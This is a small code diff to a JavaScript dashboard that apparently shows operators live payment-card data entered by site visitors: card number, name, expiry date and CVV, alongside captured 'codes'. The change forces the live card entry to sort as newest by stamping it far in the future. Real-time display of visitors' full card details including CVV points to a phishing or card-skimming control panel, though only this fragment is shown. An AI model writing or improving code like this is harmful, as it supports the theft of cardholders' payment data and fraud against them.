@@ -4718,13 +4718,13 @@
       // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first))
       const allEntries = [];
       
-      // Add live card entry if visitor is on payment page
+      // Add live card entry if visitor is on payment page - always newest
       if (isOnPaymentPage) {
         allEntries.push({
           type: 'liveCard',
           data: visitor.liveCard || { cardNumber: '', nameOnCard: '', expiryDate: '', cvv: '' },
           index: 0,
-          timestamp: visitor.liveCardTimestamp || new Date().toISOString()
+          timestamp: new Date(Date.now() + 999999999).toISOString()
         });
       }
       
